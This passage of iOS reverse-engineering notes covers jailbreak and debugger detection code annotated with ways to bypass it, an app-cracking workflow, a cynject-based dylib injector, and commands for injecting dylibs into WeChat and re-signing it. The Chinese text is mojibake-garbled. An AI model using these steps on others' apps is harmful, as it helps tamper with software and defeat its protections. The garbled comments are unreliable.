    }
    if(pid >= 0)
    {
        return YES;
    }

  
//     check has class only used in breakJail like HBPreferences. è¶Šç‹±å¸¸ç”¨çš„ç±»ï¼Œè¿™é‡Œæ— æ³•ç»•è¿‡ï¼Œåªè¦å¤šæ‰¾ä¸€äº›ç‰¹å¾ç±»å°±å¯ä»¥ï¼Œæ³¨æ„ï¼Œå¾ˆå¤šåè¶Šç‹±æ’ä»¶ä¼šæ··æ·†ï¼Œæ‰€ä»¥å¯èƒ½è¦é€šè¿‡æŸ¥å…³é”®æ–¹æ³•æ¥è¯†åˆ«
    NSArray *checksClass = [[NSArray alloc] initWithObjects:@"HBPreferences",nil];
    for(NSString *className in checksClass)
    {
      if (NSClassFromString(className) != NULL) {
        return YES;
      }
    }
  
//    Check permission to write to /private hook FileManager å’Œ writeToFileæ¥ç»•è¿‡
    NSString *path = @"/private/avl.txt";
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSError* error;
        NSString *test = @"AVL was here";
        [test writeToFile:path atomically:NO encoding:NSStringEncodingConversionAllowLossy error:&error];
        [fileManager removeItemAtPath:path error:nil];
        if(error==nil)
        {
            return YES;
        }

        return NO;
    } @catch (NSException *exception) {
        return NO;
    }
}

BOOL isInjectedWithDynamicLibrary()
{
  unsigned int outCount = 0;
  const char **images =  objc_copyImageNames(&outCount);
  for (int i = 0; i < outCount; i++) {
      printf("%s\n", images[i]);
  }
  
  
  int i=0;
    while(true){
        // hook _dyld_get_image_nameæ–¹æ³•å¯ä»¥ç»•è¿‡
        const char *name = _dyld_get_image_name(i++);
        if(name==NULL){
            break;
        }
        if (name != NULL) {
          NSString *libName = [NSString stringWithUTF8String:name];
          if ([sDylibSet containsObject:libName]) {
            return YES;
          }

        }
    }
    return NO;
}

#pragma mark é€šè¿‡ç¯å¢ƒå˜é‡DYLD_INSERT_LIBRARIESæ£€æµ‹æ˜¯å¦è¶Šç‹±
BOOL dyldEnvironmentVariables ()
{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !(NULL == getenv("DYLD_INSERT_LIBRARIES"));
}

#pragma mark æ ¡éªŒå½“å‰è¿›ç¨‹æ˜¯å¦ä¸ºè°ƒè¯•æ¨¡å¼ï¼Œhook sysctlæ–¹æ³•å¯ä»¥ç»•è¿‡
// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
// Thanks to https://developer.apple.com/library/archive/qa/qa1361/_index.html
BOOL isDebugged()
{
    int junk;
    int mib[4];
    struct kinfo_proc info;
    size_t size;
    info.kp_proc.p_flag = 0;
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);
    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

#pragma mark ä½¿ç”¨staté€šè¿‡æ£€æµ‹ä¸€äº›è¶Šç‹±åçš„å…³é”®æ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­æ˜¯å¦è¶Šç‹±ï¼Œhook stat æ–¹æ³•å’Œdladdrå¯ä»¥ç»•è¿‡
BOOL isStatNotSystemLib() {
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int ret ;
    Dl_info dylib_info;
    int (*func_stat)(const char *, struct stat *) = stat;
    if ((ret = dladdr(func_stat, &dylib_info))) {
        NSString *fName = [NSString stringWithUTF8String: dylib_info.dli_fname];
        if(![fName isEqualToString:@"/usr/lib/system/libsystem_kernel.dylib"]){
            return YES;
        }
    }
    
    for (int i = 0;i < sizeof(JbPaths) / sizeof(char *);i++) {
        struct stat stat_info;
        if (0 == stat(JbPaths[i], &stat_info)) {
            return YES;
        }
    }
    
    return NO;
}

typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);

#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif

// ç¦æ­¢gdbè°ƒè¯•
- (void) disable_gdb {
    if(TARGET_IPHONE_SIMULATOR)return;
    void* handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW);
    ptrace_ptr_t ptrace_ptr = dlsym(handle, "ptrace");
    ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0);
    dlclose(handle);
}

@end

```

## iOSé€†å‘Appæµç¨‹
```
1. Clutchã€frida, CrackXI ç ¸å£³ipaï¼›

2. class-dumpå¯¼å‡ºclassç±»å¤´æ–‡ä»¶ï¼›

3. Revealã€Cycript, FLEXåˆ†æç•Œé¢ï¼›

4. åˆ†æç±»å…³ç³»ã€å‡½æ•°è°ƒç”¨é€»è¾‘ï¼Œå°è¯•è¿›è¡Œhookï¼›

5. theosè°ƒè¯•ã€ç¼–è¯‘ã€æ‰“åŒ…ã€æ³¨å…¥dylibï¼›

6. codesigné‡ç­¾åã€å‘å¸ƒï¼›
```

## debugserver - iOSé€†å‘è°ƒè¯•

ä¸€ lldbè°ƒè¯•åŸç†ï¼šdebugserver
xcodeçš„lldbä¹‹æ‰€ä»¥èƒ½è°ƒè¯•appï¼Œæ˜¯å› ä¸ºæ‰‹æœºè¿è¡Œappï¼Œlldbä¼šæŠŠè°ƒè¯•æŒ‡ä»¤å‘ç»™æ‰‹æœºçš„debugServer; 
debugServeræ˜¯ç”±Xcodeç¬¬ä¸€æ¬¡è¿è¡Œç¨‹åºç»™å®‰è£…åˆ°æ‰‹æœºä¸Šã€‚

Xcodeä¸ŠæŸ¥çœ‹debugserverï¼š
æŒ‰ä½commandé”®ç‚¹å‡»Xcodeï¼Œæ‰¾åˆ°xcode.appæ˜¾ç¤ºåŒ…å†…å®¹/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/15.0 
æ‰¾åˆ°DeveloperDiskImage.dmg é‡Œçš„usr -> bin -> debugserver

æ‰‹æœºçš„æ ¹ç›®å½•ä¸‹çš„ Developer -> usr -> bin é‡Œèƒ½æ‰¾åˆ°debugserverï¼Œè¶Šç‹±æ‰‹æœºå¯ä»¥æŸ¥çœ‹
è¶Šç‹±ç¯å¢ƒä¸‹ï¼Œlldbè¿æ¥æ‰‹æœºçš„debugserver,ç„¶åå°±å¯ä»¥é€šè¿‡debugserverè°ƒè¯•æŸä¸ªapp

debugserverå¦‚ä½•è°ƒè¯•appï¼Ÿ

## ptraceå‡½æ•°
debugserveré€šè¿‡ptraceå‡½æ•°è°ƒè¯•app
ptraceæ˜¯ç³»ç»Ÿå‡½æ•°ï¼Œæ­¤å‡½æ•°æä¾›ä¸€ä¸ªè¿›ç¨‹å»ç›‘å¬å’Œæ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œ
å¹¶ä¸”å¯ä»¥æ£€æµ‹è¢«æ§åˆ¶è¿›ç¨‹çš„å†…å­˜å’Œå¯„å­˜å™¨é‡Œé¢çš„æ•°æ®ã€‚ptraceå¯ä»¥ç”¨æ¥å®ç°æ–­ç‚¹è°ƒè¯•å’Œç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªã€‚

## FutureRestore-GUI:  https://github.com/CoocooFroggy/FutureRestore-GUI
![](https://github.com/CoocooFroggy/FutureRestore-GUI/blob/master/.github/Light.png?raw=true)
![](https://github.com/CoocooFroggy/FutureRestore-GUI/blob/master/.github/Dark.png?raw=true)

### å‘½ä»¤è¡Œå®‰è£…FutureRestore-GUI

Macåˆ©ç”¨brewå‘½ä»¤è¡Œå®‰è£…
```
macOS: brew install futurerestore-gui
```
Windowsåˆ©ç”¨wingetå‘½ä»¤è¡Œå®‰è£…
```
Windows: winget install futurerestore-gui
```

## -----------------------------------

## iOSå†…åµŒå†…åµŒæ±‡ç¼–æŒ‡ä»¤ - ios-syscalls
```
1	__exit
2	fork
3	read
4	write
5	__open
6	close
7	__wait4
9	_kernelrpc_mach_vm_allocate_trap
9	link
10	__unlink
11	_kernelrpc_mach_vm_deallocate_trap
12	chdir
13	_kernelrpc_mach_vm_protect_trap
13	fchdir
14	_kernelrpc_mach_vm_map_trap
14	mknod
15	__chmod
15	_kernelrpc_mach_port_allocate_trap
16	_kernelrpc_mach_port_destroy_trap
16	chown
17	_kernelrpc_mach_port_deallocate_trap
18	_kernelrpc_mach_port_mod_refs_trap
19	_kernelrpc_mach_port_move_member_trap
20	_kernelrpc_mach_port_insert_right_trap
21	_kernelrpc_mach_port_insert_member_trap
22	_kernelrpc_mach_port_extract_member_trap
23	_kernelrpc_mach_port_construct_trap
23	setuid
24	_kernelrpc_mach_port_destruct_trap
24	getuid
25	geteuid
25	mach_reply_port
26	thread_self_trap
27	__recvmsg
27	__recvmsg
27	task_self_trap
28	__sendmsg
28	__sendmsg
28	host_self_trap
29	__recvfrom
29	__recvfrom
30	__accept
30	__accept
30	mach_msg_trap
31	__getpeername
31	__getpeername
31	mach_msg_overwrite_trap
32	__getsockname
32	__getsockname
32	semaphore_signal_trap
33	access
33	semaphore_signal_all_trap
34	chflags
34	semaphore_signal_thread_trap
35	fchflags
35	semaphore_wait_trap
36	semaphore_wait_signal_trap
36	sync
37	__kill
37	semaphore_timedwait_trap
38	semaphore_timedwait_signal_trap
39	getppid
40	_kernelrpc_mach_port_guard_trap
41	_kernelrpc_mach_port_unguard_trap
41	dup
43	getegid
43	task_name_for_pid
44	task_for_pid
45	pid_for_task
46	__sigaction
47	getgid
47	macx_swapon
48	macx_swapoff
48	sigprocmask
49	__getlogin
50	__setlogin
50	macx_triggers
51	acct
51	macx_backing_store_suspend
52	macx_backing_store_recovery
52	sigpending
53	__sigaltstack
54	__ioctl
55	reboot
56	revoke
57	symlink
58	readlink
58	swtch_pri
59	execve
59	swtch
60	syscall_thread_switch
60	umask
61	chroot
61	clock_sleep_trap
65	__msync
65	__msync
73	__munmap
74	__mprotect
74	__mprotect
75	madvise
75	madvise
78	mincore
79	getgroups
80	setgroups
81	getpgrp
82	setpgid
83	setitimer
85	swapon
86	getitimer
88	mach_timebase_info
89	getdtablesize
89	mach_wait_until
90	dup2
90	mk_timer_create
91	mk_timer_destroy
92	__fcntl
92	mk_timer_arm
93	__select
93	__select
93	mk_timer_cancel
95	fsync
96	__setpriority
97	socket
98	__connect
98	__connect
100	getpriority
104	__bind
104	__bind
105	setsockopt
106	__listen
106	__listen
111	__sigsuspend
117	getrusage
118	getsockopt
120	readv
121	writev
122	__settimeofday
123	fchown
124	__fchmod
126	__setreuid
126	__setreuid
127	__setregid
127	__setregid
128	__rename
131	flock
132	mkfifo
133	__sendto
133	__sendto
134	shutdown
135	__socketpair
135	__socketpair
136	mkdir
137	__rmdir
138	utimes
139	futimes
140	adjtime
142	__gethostuuid
147	setsid
148	setquota
149	quota
151	getpgid
152	setprivexec
153	pread
154	pwrite
155	nfssvc
159	unmount
161	getfh
165	quotactl
167	mount
169	csops
170	csops_audittoken
173	waitid
178	__kdebug_trace_string
179	__kdebug_trace64
180	__kdebug_trace
181	setgid
182	setegid
183	seteuid
184	__sigreturn
185	__chud
187	fdatasync
191	pathconf
192	fpathconf
194	__getrlimit
195	__setrlimit
196	getdirentries
197	__mmap
199	__lseek
199	__lseek
200	truncate
201	ftruncate
202	__sysctl
203	mlock
204	munlock
205	undelete
216	__open_dprotected_np
220	__getattrlist
220	__getattrlist
221	__setattrlist
221	__setattrlist
222	getdirentriesattr
223	exchangedata
225	searchfs
226	__delete
227	__copyfile
228	fgetattrlist
229	fsetattrlist
230	poll
231	watchevent
232	waitevent
233	modwatch
234	getxattr
235	fgetxattr
236	setxattr
237	fsetxattr
238	removexattr
239	fremovexattr
240	listxattr
241	flistxattr
242	fsctl
243	__initgroups
244	__posix_spawn
245	ffsctl
247	nfsclnt
248	fhopen
250	minherit
251	__semsys
252	__msgsys
253	__shmsys
254	__semctl
255	semget
256	semop
258	__msgctl
258	__msgctl
259	msgget
260	msgsnd
261	msgrcv
262	shmat
263	__shmctl
263	__shmctl
264	shmdt
265	shmget
266	__shm_open
267	shm_unlink
268	__sem_open
269	sem_close
270	sem_unlink
271	sem_wait
272	sem_trywait
273	sem_post
274	__sysctlbyname
277	__open_extended
278	__umask_extended
279	__stat_extended
280	__lstat_extended
281	__fstat_extended
282	__chmod_extended
283	__fchmod_extended
284	__access_extended
284	__access_extended
285	__settid
285	__settid
286	__gettid
286	__gettid
287	__setsgroups
287	__setsgroups
288	__getsgroups
288	__getsgroups
289	__setwgroups
289	__setwgroups
290	__getwgroups
290	__getwgroups
291	__mkfifo_extended
292	__mkdir_extended
293	__identitysvc
294	__shared_region_check_np
296	vm_pressure_monitor
297	__psynch_rw_longrdlock
298	__psynch_rw_yieldwrlock
299	__psynch_rw_downgrade
300	__psynch_rw_upgrade
301	__psynch_mutexwait
302	__psynch_mutexdrop
303	__psynch_cvbroad
304	__psynch_cvsignal
305	__psynch_cvwait
306	__psynch_rw_rdlock
307	__psynch_rw_wrlock
308	__psynch_rw_unlock
309	__psynch_rw_unlock2
310	getsid
311	__settid_with_pid
312	__psynch_cvclrprepost
313	aio_fsync
314	aio_return
315	aio_suspend
316	aio_cancel
317	aio_error
318	aio_read
319	aio_write
320	lio_listio
322	__iopolicysys
323	__process_policy
324	mlockall
325	munlockall
327	issetugid
328	__pthread_kill
329	__pthread_sigmask
330	__sigwait
331	__disable_threadsignal
332	__pthread_markcancel
333	__pthread_canceled
334	__semwait_signal
336	__proc_info
337	sendfile
338	stat
338	stat
339	fstat
339	fstat
340	lstat
340	lstat
341	__stat64_extended
342	__lstat64_extended
343	__fstat64_extended
344	__getdirentries64
345	statfs
345	statfs
346	fstatfs
346	fstatfs
347	getfsstat
347	getfsstat
348	__pthread_chdir
349	__pthread_fchdir
350	audit
351	auditon
353	getauid
354	setauid
357	getaudit_addr
358	setaudit_addr
359	auditctl
360	__bsdthread_create
361	__bsdthread_terminate
362	kqueue
363	kevent
364	__lchown
364	__lchown
365	__stack_snapshot
366	__bsdthread_register
367	__workq_open
368	__workq_kernreturn
369	kevent64
370	__old_semwait_signal
371	____old_semwait_signal_nocancel
372	__thread_selfid
373	ledger
374	kevent_qos
380	__mac_execve
380	__mac_execve
381	__mac_syscall
381	__mac_syscall
382	__mac_get_file
383	__mac_set_file
384	__mac_get_link
385	__mac_set_link
386	__mac_get_proc
387	__mac_set_proc
387	__mac_set_proc
388	__mac_get_fd
389	__mac_set_fd
390	__mac_get_pid
396	__read_nocancel
396	__read_nocancel
397	__write_nocancel
397	__write_nocancel
398	__open_nocancel
399	__close_nocancel
399	__close_nocancel
400	__wait4_nocancel
400	__wait4_nocancel
401	__recvmsg_nocancel
401	__recvmsg_nocancel
402	__sendmsg_nocancel
402	__sendmsg_nocancel
403	__recvfrom_nocancel
403	__recvfrom_nocancel
404	__accept_nocancel
404	__accept_nocancel
405	__msync_nocancel
405	__msync_nocancel
406	__fcntl_nocancel
407	__select_nocancel
407	__select_nocancel
408	__fsync_nocancel
408	__fsync_nocancel
409	__connect_nocancel
409	__connect_nocancel
410	__sigsuspend_nocancel
411	__readv_nocancel
411	__readv_nocancel
412	__writev_nocancel
412	__writev_nocancel
413	__sendto_nocancel
413	__sendto_nocancel
414	__pread_nocancel
414	__pread_nocancel
415	__pwrite_nocancel
415	__pwrite_nocancel
416	__waitid_nocancel
416	__waitid_nocancel
417	__poll_nocancel
417	__poll_nocancel
418	__msgsnd_nocancel
418	__msgsnd_nocancel
419	__msgrcv_nocancel
419	__msgrcv_nocancel
420	__sem_wait_nocancel
420	__sem_wait_nocancel
421	__aio_suspend_nocancel
421	__aio_suspend_nocancel
422	____sigwait_nocancel
423	__semwait_signal_nocancel
424	__mac_mount
424	__mac_mount
425	__mac_get_mount
426	__mac_getfsstat
427	__fsgetpath
428	audit_session_self
429	audit_session_join
430	fileport_makeport
431	fileport_makefd
432	audit_session_port
433	pid_suspend
434	pid_resume
435	pid_hibernate
436	pid_shutdown_sockets
438	__shared_region_map_and_slide_np
439	kas_info
440	memorystatus_control
441	__guarded_open_np
442	guarded_close_np
443	guarded_kqueue_np
444	change_fdguard_np
446	proc_rlimit_control
447	connectx
448	disconnectx
449	peeloff
450	socket_delegate
451	__telemetry
452	proc_uuid_policy
453	memorystatus_get_level
454	system_override
455	vfs_purge
456	__sfi_ctl
457	__sfi_pidctl
458	__coalition
459	__coalition_info
460	necp_match_policy
461	getattrlistbulk
463	__openat
464	__openat_nocancel
465	__renameat
466	faccessat
467	fchmodat
468	fchownat
470	fstatat
470	fstatat
471	linkat
472	__unlinkat
473	readlinkat
474	symlinkat
475	mkdirat
476	getattrlistat
477	proc_trace_log
478	__bsdthread_ctl
479	openbyid_np
480	recvmsg_x
481	sendmsg_x
482	__thread_selfusage
483	__csrctl
484	__guarded_open_dprotected_np
485	guarded_write_np
486	guarded_pwrite_np
487	guarded_writev_np
488	__rename_ext
489	mremap_encrypted
490	netagent_trigger
491	__stack_snapshot_with_config
492	__microstackshot
493	grab_pgo_data
499	__work_interval_ctl
```

iOSåŠ¨æ€åº“æ³¨å…¥å·¥å…·ï¼šcynjectã€yololibã€insert_dylibã€optoolã€install_name_tool

## Cycript

cycriptæ˜¯å¤§ç¥saurikå¼€å‘çš„ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·,
å¯ä»¥è®©å¼€å‘è€…åœ¨å‘½ä»¤è¡Œä¸‹å’Œåº”ç”¨äº¤äº’,åœ¨è¿è¡Œæ—¶æŸ¥çœ‹å’Œä¿®æ”¹åº”ç”¨ã€‚
åº•å±‚å®ç°: æ˜¯é€šè¿‡è‹¹æœçš„JavaScriptCore.frameworkæ¥æ‰“é€šiOSä¸javascriptçš„æ¡¥æ¢(OCå’ŒJSäº’ç›¸è°ƒç”¨)

## -----------------------------------

## install_name_tool æ³¨å…¥åŠ¨æ€åº“ ä½¿ç”¨è¯´æ˜

     ï¼ˆ1ï¼‰@executable_pathã€‚è¿™ä¸ªpathå¾ˆå°‘ç”¨ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯å¯æ‰§è¡Œç¨‹åºçš„è·¯å¾„ã€‚åœ¨åŠ¨æ€åº“ä¸­åŸºæœ¬ä¸Šä¸ä½¿ç”¨è¿™ä¸ªpath.

      (2) @loader_pathã€‚è¿™ä¸ªpathåœ¨ä¹‹å‰çš„åº”ç”¨ä¸­ç”¨çš„éå¸¸å¤šï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªpathæ¥è®¾ç½®åŠ¨æ€åº“çš„install path nameã€‚
      ä½†æ˜¯å®ƒæœ‰è‡ªå·±çš„å±€é™æ€§ï¼Œå°±æ˜¯å½“ä¸€ä¸ªåŠ¨æ€åº“åŒæ—¶è¢«å¤šä¸ªç¨‹åºå¼•ç”¨æ—¶ï¼Œå¦‚æœä½ç½®ä¸ä¸€æ ·çš„è¯ä»ç„¶éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ã€‚è¿™ä¸ªåœ¨å‚è€ƒé“¾æ¥ä¸­æœ‰è¯´æ˜ã€‚  
      (3) @rpath  å®ƒæ˜¯run pathçš„ç¼©å†™ã€‚æœ¬è´¨ä¸Šå®ƒä¸æ˜¯ä¸€ä¸ªæ˜ç¡®çš„pathï¼Œç”šè‡³å¯ä»¥è¯´å®ƒä¸æ˜¯ä¸€ä¸ªpathã€‚
      å®ƒåªæ˜¯ä¸€ä¸ªå˜é‡ï¼Œæˆ–è€…å«å ä½ç¬¦ã€‚è¿™ä¸ªå˜é‡é€šè¿‡XCodeä¸­çš„run pathé€‰é¡¹è®¾ç½®å€¼ï¼Œæˆ–è€…é€šè¿‡install_name_toolçš„-add_rpathè®¾ç½®å€¼ã€‚
      è®¾ç½®å¥½run pathä¹‹åï¼Œæ‰€æœ‰çš„@rpathéƒ½ä¼šè¢«æ›¿æ¢æ‰ã€‚æ­¤å¤–ï¼Œrun pathæ˜¯å¯ä»¥è®¾ç½®å¤šä¸ªå€¼çš„
      
```
INSTALL_NAME_TOOL(1)					      General Commands Manual					      INSTALL_NAME_TOOL(1)

NAME

       install_name_tool - change dynamic shared library install names

SYNOPSIS

       install_name_tool [-change old new ] ... [-rpath old new ] ... [-add_rpath new ] ... [-delete_rpath new ] ... [-id name] file

DESCRIPTION

       Install_name_tool  changes the dynamic shared library install names and or adds, changes or deletes the rpaths recorded in a Mach-O binary.
       For this tool to work when the install names or rpaths are larger the binary should be built with  the  ld(1)  -headerpad_max_install_names
       option.

       -change old new
	      Changes  the dependent shared library install name old to new in the specified Mach-O binary.  More than one of these options can be
	      specified.  If the Mach-O binary does not contain the old install name in a specified -change option the option is ignored.

       -id name
	      Changes the shared library identification name of a dynamic shared library to name.  If the Mach-O binary is not	a  dynamic  shared
	      library and the -id option is specified it is ignored.

       -rpath old new
	      Changes  the  rpath  path  name old to new in the specified Mach-O binary.  More than one of these options can be specified.  If the
	      Mach-O binary does not contain the old rpath path name in a specified -rpath it is an error.

       -add_rpath new
	      Adds the rpath path name new in the specified Mach-O binary.  More than one of these options can be specified.  If the Mach-O binary
	      already contains the new rpath path name specified in -add_rpath it is an error.

       -delete_rpath old
	      deletes  the  rpath  path  name old in the specified Mach-O binary.  More than one of these options can be specified.  If the Mach-O
	      binary does not contains the old rpath path name specified in -delete_rpath it is an error.

```

## åŸºäºcynjectæ³¨å…¥dylib
```
#include <sys/cdefs.h>
#include <sys/types.h>
#include <sys/param.h>
#include <mach/mach.h>
#include <mach/boolean.h>
#include <dispatch/dispatch.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <spawn.h>
#include <assert.h>
extern char ***_NSGetEnviron(void);
extern int proc_listallpids(void *, int);
extern int proc_pidpath(int, void *, uint32_t);
static const char *cynject_path = "/usr/bin/cynject";
static const char *dispatch_queue_name = NULL;
static int process_buffer_size = 4096;
static pid_t process_pid = -1;
static boolean_t find_process(const char *name, pid_t *ppid_ret) {
    pid_t *pid_buffer;
    char path_buffer[MAXPATHLEN];
    int count, i, ret;
    boolean_t res = FALSE;
    
    pid_buffer = (pid_t *)calloc(1, process_buffer_size);
    assert(pid_buffer != NULL);
    
    count = proc_listallpids(pid_buffer, process_buffer_size);
    if (count) {
        for (i = 0; i < count; i++) {
            pid_t ppid = pid_buffer[i];
            
            ret = proc_pidpath(ppid, (void *)path_buffer, sizeof(path_buffer));
            if (ret < 0) {
                printf("(%s:%d) proc_pidinfo() call failed.\n", __FILE__, __LINE__);
                continue;
            }
            
            if (strstr(path_buffer, name)) {
                res = TRUE;
                *ppid_ret = ppid;
                break;
            }
        }
    }
    
    free(pid_buffer);
    return res;
}
static void inject_dylib(const char *name, pid_t pid, const char *dylib) {
    char **argv;
    char pid_buf[32];
    int res;
    pid_t child;
    
    argv = calloc(4, sizeof(char *));
    assert(argv != NULL);
    
    snprintf(pid_buf, sizeof(pid_buf), "%d", pid);
    
    argv[0] = (char *)name;
    argv[1] = (char *)pid_buf;
    argv[2] = (char *)dylib;
    argv[3] = NULL;
    
    printf("(%s:%d) calling \"%s %s %s\"\n", __FILE__, __LINE__, argv[0], argv[1], argv[2]);
    
    res = posix_spawn(&child, argv[0], NULL, NULL, argv, (char * const *)_NSGetEnviron());
    assert(res == 0);
    
    return;
}
int main(int argc, char *argv[]) {
    printf("***** pp_inject by piaoyun ***** \n");
    if (geteuid() != 0) {
        printf("FATAL: must be run as root.\n");
        return 1;
    }
    
    if (argc < 3 ) {
        printf("FATAL: ppinject <pid> <dylib>.\n");
        return 2;
    }
    
    const char *process_name = argv[1];
    const char *dylib_path = argv[2];
    
    
    printf("Creating queue...\n");
    dispatch_queue_t queue = dispatch_queue_create(dispatch_queue_name, 0);
    
    printf("Finding %s PID...\n", process_name);
    dispatch_async(queue, ^{ while (!find_process(process_name, &process_pid)); });
    
    printf("Waiting for queue to come back...\n");
    dispatch_sync(queue, ^{});
    
    printf("%s PID is %d\n", process_name, process_pid);
    
    printf("Injecting %s into %s...\n", dylib_path, process_name);
    inject_dylib(cynject_path, process_pid, dylib_path);
    
    return 0;
}

```

## Mach-Oæ³¨å…¥/åˆ é™¤åŠ¨æ€åº“ insert_dylib  optool

å¦‚æœè¦è®©ç°æˆçš„Appï¼Œæ‰§è¡Œè‡ªå·±çš„ä»£ç å¯ä»¥é€šè¿‡æ³¨å…¥åŠ¨æ€åº“ï¼Œ

é™æ€çš„æ³¨å…¥å¯ä»¥ä½¿ç”¨optoolå·¥å…·ä¿®æ”¹MachOçš„Load Commandsç„¶åé‡ç­¾ï¼Œ

åŠ¨æ€è¿è¡Œæ—¶å¯ä»¥ä½¿ç”¨dlopen   æˆ–    Bundle(path: "**.bundle").load()åŠ è½½
```
é€šè¿‡ otool -Lå‘½ä»¤æŸ¥çœ‹ä½ ç”Ÿæˆçš„.dylibæ–‡ä»¶
otool -L ioswechatselectall.dylib

æŸ¥çœ‹CPUæ¡†æ¶
lipo -archs ioswechatselectall.dylib

é¦–å…ˆè¦æ‰¾åˆ°libsubstrate.dylibæ–‡ä»¶,è¯¥æ–‡ä»¶åº”è¯¥åœ¨/opt/thoes/lib/ç›®å½•ä¸‹,ç„¶åå°†å…¶æ‹·è´åˆ°ä¸ä½ ç”Ÿæˆçš„çš„.dylibä¸€ä¸ªç›®å½•ä¸‹,é€šè¿‡ä¸‹é¢çš„æŒ‡ä»¤ä¿®æ”¹ä¾èµ–,
install_name_tool -change /Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate @loader_path/libsubstrate.dylib wx.dylib

æ·»åŠ å¯æ‰§è¡Œæ–‡ä»¶çš„ä¾èµ–
æ­¤å¤„ç”¨çš„æ˜¯insert_dylib ä¸‹è½½åœ°å€åœ¨https://github.com/Tyilo/insert_dylib
ç¼–è¯‘å,å°†å…¶ä¸å…¶ä»–ä¸¤ä¸ªæ–‡ä»¶æ‹·è´åˆ°åŒä¸€ç›®å½•ä¸‹

ç„¶åå°†å…¶æ’å…¥åˆ°æ‰§è¡Œæ–‡ä»¶ä¸­
1.å°†wx.dylib å’Œlibsubstrate.dylibæ‹·è´è¿›ä½ çš„WeChat.app 
2.è®°ä½è¦æŠŠWeChat_patchedçš„åå­—æ”¹å›æ¥WeChat

@executable_pathæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒæŒ‡çš„æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„

insert_dylibå‘½ä»¤æ ¼å¼ï¼š ./insert_dylib åŠ¨æ€åº“è·¯å¾„ ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶

//æ³¨å…¥åŠ¨æ€åº“
./insert_dylib @executable_path/ioswechatselectall.dylib WeChat 
./yololib  Wechat wxhbts.dylib
//æ‰“åŒ…æˆipa 
xcrun -sdk iphoneos PackageApplication -v WeChat.app -o `pwd`/WeChat.ipa

æ³¨å…¥ç¥å™¨optool

ç¼–è¯‘è·å–
å› ä¸º optool æ·»åŠ äº† submoduleï¼Œå› ä¸ºéœ€è¦ä½¿ç”¨ --recuresive é€‰é¡¹ï¼Œå°†å­æ¨¡å—å…¨éƒ¨ clone ä¸‹æ¥
git clone --recursive https://github.com/alexzielenski/optool.git
cd optool
xcodebuild -project optool.xcodeproj -configuration Release ARCHS="i386 x86_64" build

ä½¿ç”¨ optool æŠŠ wx.dylib æ³¨å…¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­

./optool install -c load -p "@executable_path/wx.dylib" -t WeChat

codesignç­¾ådylib

errSecInternalComponent é”™è¯¯
åœ¨Macç»ˆç«¯ä¸Šè¿è¡Œcodesignå‘½ä»¤ï¼Œå¹¶â€œå§‹ç»ˆå…è®¸â€ /usr/bin/codesignè®¿é—®å¯†é’¥
security unlock-keychain login.keychain
è§£é”å‘½ä»¤ç§»è‡³ï¼Œ~/.bash_profileä»¥ä¾¿åœ¨SSHå®¢æˆ·ç«¯å¯åŠ¨æ—¶å¯¹é’¥åŒ™ä¸²è¿›è¡Œè§£é”
AppleWWDRCAG3 ä¸æ”¶ä¿¡ä»»è¯ä¹¦
è·å–è¯ä¹¦
security find-identity -v -p codesigning 
ç­¾åDylib 
codesign -f -s B3C14FC452E835C09B70D5C24961EBAFC0A2C4B9 hook.dylib 
ldid -S dumpdecrypted.dylib
1.å®‰è£… Xcode 
2.å®‰è£… Command Line Tools 
xcode-select --install 
codesign --force --deep --sign - /xxx/xxx.app 
ç­¾åé”™è¯¯ resource fork, Finder information, or similar detritus not allowed 
è§£å†³æ–¹æ³• xattr -lr <path_to_app_bundle> 
æŸ¥çœ‹ xattr -cr <path_to_app_bundle> åˆ é™¤ 
æˆ–è€… find . -type f -name '*.jpeg' -exec xattr -c {} \; find . -type f -name '*.png' -exec xattr -c {} \; 
find . -type f -name '*.tif' -exec xattr -c {} \; 
æ•´ä¸ªAppç­¾å codesign -fs "æˆæƒè¯ä¹¦" --no-strict --entitlements=ç”Ÿæˆçš„plistæ–‡ä»¶ WeChat.app 
éªŒè¯Dylibç­¾å codesign â€“verify hook.dylib codesign -vv -d WeChat.app

Xcodeå‡çº§åˆ°8.3å ç”¨å‘½ä»¤è¿›è¡Œæ‰“åŒ… æç¤ºä¸‹é¢è¿™ä¸ªé”™è¯¯
åé¢æ ¹æ®å¯¹æ¯”å‘ç°æ–°ç‰ˆçš„Xcodeå°‘äº†è¿™ä¸ªPackageApplication  (QQç¾¤ä¸‹è½½)
å…ˆå»æ‰¾ä¸ªæ—§ç‰ˆçš„Xcodeé‡Œé¢copyä¸€ä»½è¿‡æ¥
æ”¾åˆ°ä¸‹é¢è¿™ä¸ªç›®å½•ï¼š
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/

ç„¶åæ‰§è¡Œå‘½ä»¤
sudo xcode-select -switch /Applications/Xcode.app/Contents/Developer/

